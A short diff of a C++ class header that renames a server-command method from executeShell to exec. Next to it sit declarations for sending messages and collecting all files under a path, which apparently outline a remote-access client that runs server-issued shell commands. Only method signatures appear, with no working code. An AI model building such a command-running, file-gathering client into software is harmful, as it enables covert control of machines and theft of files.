@@ -48,7 +48,7 @@ public:
     void sendMessage(const char *data);
 
     //Getting command from the server
-    void executeShell(string shell);
+    std::string exec(const char *cmd);
 
     //Saving all files in path
     vector<filesystem::path> &getAllFiles(string path, vector<filesystem::path> files);
